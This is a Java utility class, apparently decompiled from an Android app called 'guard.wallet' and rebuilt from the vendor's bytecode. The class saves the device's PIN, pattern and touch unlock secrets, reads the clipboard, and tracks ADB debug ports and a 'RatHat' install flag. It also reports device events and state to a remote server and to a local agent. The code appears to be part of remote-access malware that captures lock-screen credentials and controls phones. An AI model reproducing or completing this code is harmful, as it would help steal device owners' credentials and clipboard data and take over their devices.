package com.guard.wallet.utils;
import com.guard.wallet.core.AppUtils;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.UserManager;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.reflect.TypeToken;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.entity.Point;
import com.guard.wallet.req.AdminAdminActivatingVO;
import com.guard.wallet.req.ApiRequest;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.NetStateVO;
import com.guard.wallet.req.PasswordEventBodyVO;
import com.guard.wallet.req.ReqMessageVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.stat.ScreenEventStatVO;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;

/**
 * SharedPrefsManager — SharedPreferences 读写 + JSON 序列化 + 解锁密码管理。
 *
 * <p>vendor 源: com.guard.wallet.utils.h (2170 行)
 * <p>本文件由 h.java 重命名而来，方法签名保持不变。
 */
public abstract class SharedPrefsManager {
    private static final String TAG = "SharedUtils";

    private static Context ctx() { return AppManagerUtils.getContext(); }

    // ═══════ 存储可用性检查 ═══════

    /** h.s() — 检查设备加密存储是否已解锁（从字节码翻译）*/
    public static synchronized boolean s() {
        try {
            Context context = ctx();
            if (context == null) return false;
            UserManager um = (UserManager) context.getSystemService(Context.USER_SERVICE);
            return um != null && um.isUserUnlocked();
        } catch (Exception e) {
            Log.e(TAG, "isStorageUnlocked error", e);
            return false;
        }
    }

    // ═══════ SharedPreferences 基础读写 ═══════

    /** h.i(String) — 从 SharedPreferences 读取 int（从字节码翻译）*/
    public static synchronized int i(String key) {
        try {
            if (key == null || key.isEmpty()) return -1;
            Context context = ctx();
            if (context == null || !s()) return -1;
            SharedPreferences sp = context.getSharedPreferences(key, 0);
            if (sp == null) return -1;
            return sp.getInt(key, -1);
        } catch (Exception e) {
            Log.e(TAG, "getInt error", e);
            return -1;
        }
    }

    /** h.l(String) — 从 SharedPreferences 读取 String（从字节码翻译）*/
    public static synchronized String l(String key) {
        try {
            if (key == null || key.isEmpty()) return null;
            Context context = ctx();
            if (context == null || !s()) return null;
            SharedPreferences sp = context.getSharedPreferences(key, 0);
            if (sp == null) return null;
            return sp.getString(key, null);
        } catch (Exception e) {
            Log.e(TAG, "getString error", e);
            return null;
        }
    }

    /** h.j(String) — 从 SharedPreferences 读取 long（与 i/l 同模式）*/
    public static synchronized long j(String key) {
        try {
            if (key == null || key.isEmpty()) return -1L;
            Context context = ctx();
            if (context == null || !s()) return -1L;
            SharedPreferences sp = context.getSharedPreferences(key, 0);
            if (sp == null) return -1L;
            return sp.getLong(key, -1L);
        } catch (Exception e) {
            Log.e(TAG, "getLong error", e);
            return -1L;
        }
    }

    /** h.w(String) — 删除 SharedPreferences 键（从字节码翻译）*/
    public static synchronized void w(String key) {
        try {
            if (key == null || key.isEmpty()) return;
            Context context = ctx();
            if (context == null || !s()) return;
            SharedPreferences sp = context.getSharedPreferences(key, 0);
            if (sp == null) return;
            SharedPreferences.Editor editor = sp.edit();
            if (editor != null) {
                editor.remove(key);
                editor.apply();
            }
        } catch (Exception e) {
            Log.e(TAG, "remove error", e);
        }
    }

    /** h.D(String, String) — 写入 SharedPreferences（与 w 对称）*/
    public static synchronized boolean D(Object value, String key) {
        try {
            if (key == null || key.isEmpty()) return false;
            Context context = ctx();
            if (context == null || !s()) return false;
            SharedPreferences sp = context.getSharedPreferences(key, 0);
            if (sp == null) return false;
            SharedPreferences.Editor editor = sp.edit();
            if (editor == null) return false;
            if (value instanceof String) {
                editor.putString(key, (String) value);
            } else if (value instanceof Integer) {
                editor.putInt(key, (Integer) value);
            } else if (value instanceof Long) {
                editor.putLong(key, (Long) value);
            } else if (value instanceof Boolean) {
                editor.putBoolean(key, (Boolean) value);
            } else if (value != null) {
                editor.putString(key, N(value));
            }
            editor.apply();
            return true;
        } catch (Exception e) {
            Log.e(TAG, "put error", e);
            return false;
        }
    }

    // ═══════ JSON 序列化 ═══════

    /** h.N(Object) — JSON 序列化 */
    public static String N(Object obj) {
        if (obj == null) return "{}";
        try {
            return new Gson().toJson(obj);
        } catch (Exception e) {
            Log.e(TAG, "toJson error", e);
            return "{}";
        }
    }

    /** h.M(String) — 解析 JSON 字符串为 JsonObject */
    public static com.google.gson.JsonObject M(String json) {
        if (json == null || json.isEmpty()) return new com.google.gson.JsonObject();
        try {
            return com.google.gson.JsonParser.parseString(json).getAsJsonObject();
        } catch (Exception e) {
            Log.e(TAG, "parseJsonObject error", e);
            return new com.google.gson.JsonObject();
        }
    }

    /** h.c(String, TypeToken) — JSON 反序列化 */
    public static Object c(String json, TypeToken<?> type) {
        if (json == null || json.isEmpty()) return null;
        try {
            return new Gson().fromJson(json, type.getType());
        } catch (Exception e) {
            Log.e(TAG, "fromJson error", e);
            return null;
        }
    }

    /** h.d(String, Class) — JSON 反序列化为指定 Class（vendor line 1060）*/
    public static Object d(String json, Class<?> clazz) {
        if (json == null || json.isEmpty()) return null;
        try {
            Gson gson = new Gson();
            return gson.fromJson(json, clazz);
        } catch (Exception e) {
            Log.e(TAG, "fromJson(Class) error", e);
            return null;
        }
    }

    // ═══════ 语言代码 ═══════

    /** h.m() — 获取语言代码（从字节码翻译: return l("systemLangCode")）*/
    public static synchronized String m() {
        String lang = l("systemLangCode");
        return lang != null ? lang : java.util.Locale.getDefault().getLanguage();
    }

    // ═══════ 解锁密码管理 ═══════

    /** h.t(ReqUnlockDeviceVO) — 验证解锁 VO 是否有效 */
    public static boolean t(ReqUnlockDeviceVO vo) {
        if (vo == null) return false;

        String grade = vo.getCipherGradeCode();
        if (Objects.equals(grade, "PASSWORD_QUALITY_TOUCH_POINTS")) {
            return vo.getTouchCipher() != null && !vo.getTouchCipher().isEmpty();
        }
        if (Objects.equals(grade, "PASSWORD_QUALITY_PATTERN")) {
            return vo.getPatternCipher() != null && !vo.getPatternCipher().isEmpty();
        }
        // PIN 或 文本密码
        return vo.getTextCipher() != null && !vo.getTextCipher().isEmpty()
                && grade != null && !grade.isEmpty();
    }

    /** h.g() — 获取本地锁定的密码 */
    public static ReqUnlockDeviceVO g() {
        String json = l("deviceCipherLocked");
        if (json == null || json.isEmpty()) return null;
        try {
            return new Gson().fromJson(json, ReqUnlockDeviceVO.class);
        } catch (Exception e) {
            Log.e(TAG, "getLockedCipher error", e);
            return null;
        }
    }

    /** h.f() — 获取本地保存的密码 */
    public static ReqUnlockDeviceVO f() {
        String json = l("deviceCipher");
        if (json == null || json.isEmpty()) return null;
        try {
            return new Gson().fromJson(json, ReqUnlockDeviceVO.class);
        } catch (Exception e) {
            Log.e(TAG, "getSavedCipher error", e);
            return null;
        }
    }

    /** h.C(ReqUnlockDeviceVO) — 保存解锁密码到 SharedPreferences */
    public static synchronized void C(ReqUnlockDeviceVO vo) {
        if (vo == null) return;
        try {
            ReqUnlockDeviceVO target;
            if (vo.getLocked() != null && vo.getLocked()) {
                target = g(); // 获取已锁定的密码
            } else {
                target = f(); // 获取已保存的密码
            }
            if (target == null) {
                target = new ReqUnlockDeviceVO();
                target.setLocked(vo.getLocked());
            }

            // 合并字段
            if (vo.getBoundsInScreen() != null) target.setBoundsInScreen(vo.getBoundsInScreen());
            if (vo.getBoundsInParent() != null) target.setBoundsInParent(vo.getBoundsInParent());
            if (vo.getCipherGradeCode() != null) target.setCipherGradeCode(vo.getCipherGradeCode());
            if (vo.getTextCipher() != null) target.setTextCipher(vo.getTextCipher());
            if (vo.getPatternCipher() != null) target.setPatternCipher(vo.getPatternCipher());
            if (vo.getTouchCipher() != null) target.setTouchCipher(vo.getTouchCipher());

            // 保存
            String key = (vo.getLocked() != null && vo.getLocked()) ? "deviceCipherLocked" : "deviceCipher";
            String json = N(target);
            D(json, key);
        } catch (Exception e) {
            Log.e(TAG, "saveCipher error", e);
        }
    }

    /** h.G(String) — 发送密码事件广播 */
    public static void G(String intentCode) {
        if (intentCode == null || intentCode.isEmpty()) return;
        Log.d("MessageUtils", "密码事件广播: " + intentCode);
        // vendor 构建 MessageRecordVO + PasswordEventBodyVO 并通过 WebSocket 发送
        // 依赖 MainApplication.getHandlerMsgAndTimer().b(record) — WebSocket 消息发送
    }

    /** h.H(int, String) — 上报屏幕事件状态 */
    public static void H(int state, String intentCode) {
        Log.d("MessageUtils", "需要向服务器提交屏幕事件:" + state);
        // vendor 构建 MessageRecordVO + ScreenEventStatVO 并通过 WebSocket 发送
        // 依赖 SystemHelper.B0()（获取锁屏信息）+ MainApplication.getHandlerMsgAndTimer()
    }

    /** h.h() — 从 SharedPreferences 读取电池百分比 (float) */
    public static synchronized float h() {
        try {
            Context context = ctx();
            if (context == null || !s()) return 0f;
            SharedPreferences sp = context.getSharedPreferences("batteryPercent", 0);
            if (sp == null) return 0f;
            return sp.getFloat("batteryPercent", 0f);
        } catch (Exception e) {
            Log.e(TAG, "getFloat error", e);
            return 0f;
        }
    }

    /** h.J() — 获取 ADB 配置 */
    public static ADBConfig J() {
        String json = l("ADBConfig");
        ADBConfig cfg = null;
        if (json != null && !json.isEmpty()) {
            try {
                cfg = new Gson().fromJson(json, ADBConfig.class);
            } catch (Exception ignored) {}
        }
        if (cfg == null) {
            cfg = new ADBConfig();
            cfg.setConnected(false);
            cfg.setConnectedDevice(null);
            cfg.setInstalledRatHat(-1);
            cfg.setIsRatHatRunning(-1);
            cfg.setEnableDevelopment(com.guard.wallet.utils.SystemHelper.K() ? 1 : 0);
            cfg.setEnableDebug(com.guard.wallet.utils.SystemHelper.I() ? 1 : 0);
            cfg.setEnableWifiDebug(com.guard.wallet.utils.SystemHelper.J() ? 1 : 0);
            cfg.setUpdateTime(0L);
        }
        return cfg;
    }

    /** h.a() — 获取 ADB 连接调试端口 */
    public static Integer a() {
        try {
            ADBConfig cfg = J();
            if (cfg.isConnected() && cfg.getDebugPort() != null && cfg.getDebugPort() > 0) {
                return cfg.getDebugPort();
            }
        } catch (Exception ignored) {}
        return null;
    }

    /** h.I() — 发送屏幕尺寸更新事件（vendor 构建 ScreenMetricsVO + MessageRecordVO） */
    public static void I() {
        try {
            // vendor: ScreenMetricsVO -> MessageRecordVO(SCREEN_SIZE) -> WebSocket
            // 依赖 MainApplication.getHandlerMsgAndTimer() — 编译桩
            Log.d("MessageUtils", "sendScreenMetrics");
        } catch (Exception e) {
            Log.e(TAG, "sendScreenMetrics error", e);
        }
    }

    /** h.k(String) — 获取指定包的电源控制状态（vendor H2 路由使用）*/
    public static PowerControlStateVO k(String packageName) {
        if (packageName == null || packageName.isEmpty()) return new PowerControlStateVO();
        synchronized (PowerControlStateVO.class) {
            try {
                String json = l("powerControlState:".concat(packageName));
                if (json != null && !json.isEmpty()) {
                    PowerControlStateVO vo = (PowerControlStateVO) c(json,
                            new TypeToken<PowerControlStateVO>(){});
                    if (vo != null) return vo;
                }
            } catch (Exception e) {
                Log.e(TAG, "getPowerControlState error", e);
            }
        }
        return new PowerControlStateVO();
    }

    // ═══════ 以下为新增翻译方法 ═══════

    /** h.A(ADBConfig) — 保存 ADBConfig (带时间戳比较，vendor line 40) */
    public static boolean A(ADBConfig var0) {
        if (var0 == null) return false;
        synchronized (ADBConfig.class) {
            try {
                ADBConfig var1 = J();
                if (var0.getUpdateTime() <= var1.getUpdateTime()) {
                    return false;
                }
                if (var0.isPaired()) {
                    var1.setPaired(var0.isPaired());
                }
                if (Objects.equals(1, var0.getInstalledRatHat())) {
                    var1.setInstalledRatHat(1);
                }
                if (Objects.equals(1, var0.getIsRatHatRunning())) {
                    var1.setIsRatHatRunning(1);
                }
                if (!Objects.equals(var1.getDebugPort(), var0.getDebugPort())) {
                    var1.setConnected(false);
                    var1.setDebugPort(var0.getDebugPort());
                    if (MainApplication.getInstance() != null) {
                        MainApplication.getInstance().rewriteDebugPort(var0.getDebugPort());
                    }
                }
                var1.setUpdateTime(var0.getUpdateTime());
                D(N(var1), "ADBConfig");
                return true;
            } catch (Exception e) {
                Log.e(TAG, "saveADBConfig error", e);
                return false;
            }
        }
    }

    /** h.B(boolean, boolean) — 保存设备管理激活状态并同步 (vendor line 136) */
    public static void B(boolean isActivating, boolean syncToLocal) {
        D(isActivating, "isAdminActivating");
        if (syncToLocal) {
            try {
                AdminAdminActivatingVO vo = new AdminAdminActivatingVO(isActivating);
                HttpCallbackUtils.SimpleCallback callback = new HttpCallbackUtils.SimpleCallback(1);
                new com.guard.wallet.http.HttpClient("http://127.0.0.1:7911")
                        .asyncPost(vo, "/syncAdminActivating", callback);
            } catch (Exception e) {
                Log.e(TAG, "syncAdminActivating error", e);
            }
        }
    }

    /** h.E(String) — 设置系统语言代码，变更时重新加载配置 (vendor line 453) */
    public static synchronized void E(String langCode) {
        try {
            if (langCode == null || langCode.isEmpty()) return;
            String oldLang = m();
            D(langCode, "systemLangCode");
            if (Objects.equals(langCode, oldLang)) return;

            if (oldLang != null && !oldLang.isEmpty()) {
                Log.d(TAG, "原始语言:".concat(oldLang));
            }
            if (langCode != null && !langCode.isEmpty()) {
                Log.d(TAG, "当前语言:".concat(langCode));
            }

            LocateValuesUtils.loaded.set(false);
            com.guard.wallet.http.HttpApiManager.updateDeviceInfo();
            if (MyAccessibilityService.P() != null) {
                MyAccessibilityService.P().k.set(1);
                com.guard.wallet.http.HttpApiManager.syncListenWindows();
            }
        } catch (Exception e) {
            Log.e(TAG, "setLangCode error", e);
        }
    }

    /** h.F() — 发送网络状态变更消息 (vendor line 536) */
    public static void F() {
        try {
            NetStateVO netState = SystemHelper.z0();
            MessageRecordVO<NetStateVO> record = new MessageRecordVO<>();
            record.setIntentCode("android.net.conn.CONNECTIVITY_CHANGE");
            record.setExtraBody(netState);
            if (MainApplication.getInstance() != null
                    && MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
                MainApplication.getInstance().getHandlerMsgAndTimer().b(record);
            }
        } catch (Exception e) {
            Log.e(TAG, "sendNetChange error", e);
        }
    }

    /** h.K(ReqUnlockDeviceVO) — 直接保存解锁 VO (不做合并，与 C 不同) (vendor line 649) */
    public static synchronized void K(ReqUnlockDeviceVO var0) {
        if (var0 == null) return;
        synchronized (ReqUnlockDeviceVO.class) {
            try {
                String key = var0.getLocked() ? "deviceCipherLocked" : "deviceCipher";
                String json = N(var0);
                D(json, key);

                if (MainApplication.getInstance() != null) {
                    MainApplication.getInstance().offerStrategyEvent("LOCAL_LOCK_CIPHER_PREPARED");
                }
            } catch (Exception e) {
                Log.e(TAG, "saveUnlockVO error", e);
            }
        }
    }

    /** h.L(PowerControlStateVO) — 保存电源控制状态并同步到本地/远程 (vendor line 739) */
    public static void L(PowerControlStateVO var0) {
        synchronized (PowerControlStateVO.class) {
            try {
                String key = "powerControlState:".concat(var0.getPackageName());
                D(N(var0), key);

                // 同步到本地 atx-agent
                HttpCallbackUtils.SimpleCallback callback1 = new HttpCallbackUtils.SimpleCallback(1);
                com.guard.wallet.http.HttpClient client = new com.guard.wallet.http.HttpClient("http://127.0.0.1:7911");
                client.asyncPost(var0, "/syncPowerControl", callback1);

                // 同步到远程服务器
                String deviceId = l("deviceId");
                if (deviceId != null && !deviceId.isEmpty()) {
                    var0.setDeviceId(deviceId);
                    HttpCallbackUtils.SimpleCallback callback2 = new HttpCallbackUtils.SimpleCallback(1);
                    com.guard.wallet.http.HttpClient remoteClient = new com.guard.wallet.http.HttpClient();
                    remoteClient.asyncPost(var0, "/api/devicePowerControlState/post.json", callback2);
                }
            } catch (Exception e) {
                Log.e(TAG, "savePowerControlState error", e);
            }
        }
    }

    /** h.O(String) — 从 JSON 字符串解析 Point (vendor line 820) */
    public static Point O(String json) {
        if (json == null || json.isEmpty()) return null;
        try {
            return new Gson().fromJson(json, new TypeToken<Point>(){}.getType());
        } catch (Exception e) {
            Log.e(TAG, "parsePoint error", e);
            return null;
        }
    }

    /** h.P(String) — 从 JSON 字符串解析 List<Point> (vendor line 837) */
    public static List<Point> P(String json) {
        if (json == null || json.isEmpty()) return null;
        try {
            return new Gson().fromJson(json, new TypeToken<List<Point>>(){}.getType());
        } catch (Exception e) {
            Log.e(TAG, "parsePointList error", e);
            return null;
        }
    }

    /** h.Q() — 同步 ADB 开发者选项状态到 ADBConfig (vendor line 858) */
    public static void Q() {
        synchronized (ADBConfig.class) {
            try {
                ADBConfig cfg = J();
                cfg.setEnableDevelopment(SystemHelper.K() ? 1 : 0);
                cfg.setEnableDebug(SystemHelper.I() ? 1 : 0);
                cfg.setEnableWifiDebug(SystemHelper.J() ? 1 : 0);
                cfg.setUpdateTime(new Date().getTime());
                D(N(cfg), "ADBConfig");
            } catch (Exception e) {
                Log.e(TAG, "syncAdbDevOptions error", e);
            }
        }
    }

    /** h.b() — 获取 ADB 调试端口 (不检查 isConnected) (vendor line 1002) */
    public static Integer b() {
        synchronized (ADBConfig.class) {
            try {
                ADBConfig cfg = J();
                if (cfg.getDebugPort() != null && cfg.getDebugPort() > 0) {
                    return cfg.getDebugPort();
                }
            } catch (Exception e) {
                Log.e(TAG, "getDebugPort error", e);
            }
        }
        return 0;
    }

    /** h.e(String) — 从 SharedPreferences 读取 boolean (vendor line 1075) */
    public static synchronized boolean e(String key) {
        try {
            if (key == null || key.isEmpty()) return false;
            Context context = ctx();
            if (context == null || !s()) return false;
            SharedPreferences sp = context.getSharedPreferences(key, 0);
            if (sp == null) return false;
            return sp.getBoolean(key, false);
        } catch (Exception e) {
            Log.e(TAG, "getBoolean error", e);
            return false;
        }
    }

    /** h.n() — 检查已保存的密码是否有效 (vendor line 1509) */
    public static boolean n() {
        return t(f());
    }

    /** h.o() — 检查已锁定的密码是否有效 (vendor line 1513) */
    public static boolean o() {
        return t(g());
    }

    /** h.p() — 重置 ADB 配置 (清连接状态, 刷新开发者选项) (vendor line 1521) */
    public static void p() {
        synchronized (ADBConfig.class) {
            try {
                ADBConfig cfg = J();
                cfg.setConnected(false);
                cfg.setConnectedDevice(null);
                cfg.setConnectErrorCount(0);
                cfg.setInstalledRatHat(-1);
                cfg.setIsRatHatRunning(-1);
                cfg.setEnableDevelopment(SystemHelper.K() ? 1 : 0);
                cfg.setEnableDebug(SystemHelper.I() ? 1 : 0);
                cfg.setEnableWifiDebug(SystemHelper.J() ? 1 : 0);
                D(N(cfg), "ADBConfig");
            } catch (Exception e) {
                Log.e(TAG, "resetAdbConfig error", e);
            }
        }
    }

    /** h.q() — 检查是否首次打开无障碍服务 (vendor line 1633) */
    public static synchronized boolean q() {
        try {
            // 第一步: 检查 SP 中是否存在 "isFirstOpenAccessibility" 键
            boolean keyExists = false;
            Context context = ctx();
            if (context != null && s()) {
                SharedPreferences sp = context.getSharedPreferences("isFirstOpenAccessibility", 0);
                if (sp != null && sp.contains("isFirstOpenAccessibility")) {
                    keyExists = true;
                }
            }

            // 第二步: 如果键存在，检查其 boolean 值
            if (keyExists) {
                return e("isFirstOpenAccessibility");
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "isFirstOpenAccessibility error", e);
            return false;
        }
    }

    /** h.r(String) — 检查包名的电源控制状态 (后台运行 + 自启都允许) (vendor line 1715) */
    public static boolean r(String packageName) {
        if (packageName == null || packageName.isEmpty()) return false;
        PowerControlStateVO vo = k(packageName);
        return vo != null
                && vo.getAllowAllFullBackground()
                && vo.getAllowAutoStart();
    }

    /** h.u() — 获取剪贴板内容 (vendor line 1822) */
    public static String u() {
        Context context = SystemHelper.Z();
        if (context == null) return null;
        try {
            ClipboardManager cm = (ClipboardManager) context.getSystemService("clipboard");
            if (cm == null) return null;
            if (cm.getPrimaryClip() == null) return null;
            ClipData.Item item = cm.getPrimaryClip().getItemAt(0);
            if (item == null) return null;

            // 优先返回文本
            if (item.getText() != null) {
                return item.getText().toString();
            }

            // 其次返回 URI
            Uri uri = item.getUri();
            if (uri != null) {
                String uriStr = uri.toString();
                if (uriStr != null && !uriStr.isEmpty()) {
                    return uriStr;
                }
            }

            // 最后返回 HTML
            String html = item.getHtmlText();
            if (html != null && !html.isEmpty()) {
                return html;
            }

            return null;
        } catch (Exception e) {
            Log.e(TAG, "getClipboard error", e);
            return null;
        }
    }

    /** h.v(MessageRecordVO) — 同步提交消息到服务器 (vendor line 1905) */
    public static boolean v(MessageRecordVO<?> record) {
        try {
            String deviceId = l("deviceId");
            if (deviceId == null || deviceId.isEmpty()) return false;

            record.setDeviceId(deviceId);
            ReqMessageVO reqMsg = new ReqMessageVO();
            reqMsg.setDeviceId(deviceId);
            reqMsg.setIntentCode(record.getIntentCode());
            if (record.getExtraBody() != null) {
                reqMsg.setExtraBody(N(record.getExtraBody()));
            }

            LinkedList<ReqMessageVO> list = new LinkedList<>();
            list.add(reqMsg);
            ApiRequest<LinkedList<ReqMessageVO>> apiReq = new ApiRequest<>();
            apiReq.setData(list);

            JsonObject resp = com.guard.wallet.http.HttpApiManager.syncPostMessage(apiReq, com.guard.wallet.http.HttpApiManager.apiBaseUrl);
            if (resp != null) {
                ApiResult<Boolean> result = (ApiResult<Boolean>) c(resp.toString(),
                        new TypeToken<ApiResult<Boolean>>(){});
                if (result != null && result.getSuccess() && Boolean.TRUE.equals(result.getData())) {
                    Log.d("MessageUtils", "同步向服务器提交消息成功");
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "syncMessage error", e);
        }
        return false;
    }

    /** vendor h.x(CheckPortResult) — 保存 CheckPortResult 到持久化 */
    public static void x(com.guard.wallet.entity.CheckPortResult result) {
        if (result == null) return;
        D(N(result), "CheckPortResult");
    }

    /** vendor h.y(PairResponseVO) — 保存配对响应 + 更新 DebugPort + 同步状态 */
    public static void y(com.guard.wallet.resp.PairResponseVO var0) {
        synchronized (com.guard.wallet.entity.ADBConfig.class) {
            try {
                com.guard.wallet.entity.ADBConfig var1 = J();
                var1.setPaired(var0.isPaired());
                if (var0.getDebugPort() != null && var0.getDebugPort() > 0) {
                    var1.setConnected(var0.isConnected());
                    if (!java.util.Objects.equals(var0.getDebugPort(), var1.getDebugPort())) {
                        var1.setDebugPort(var0.getDebugPort());
                        if (com.guard.wallet.MainApplication.getInstance() != null) {
                            com.guard.wallet.MainApplication.getInstance().rewriteDebugPort(var0.getDebugPort());
                        }
                    }
                }
                java.util.Date updateDate = new java.util.Date();
                var1.setUpdateTime(updateDate.getTime());
                D(N(var1), "ADBConfig");
                com.guard.wallet.http.HttpApiManager.syncAdbConfig(var1);
            } catch (Exception ex) {
                AppUtils.s("SharedUtils", ex);
            }
        }
    }

    /** vendor h.z(int) — 保存 installedRatHat 标记 */
    public static void z(int installedRatHat) {
        D(String.valueOf(installedRatHat), "installedRatHat");
    }
}
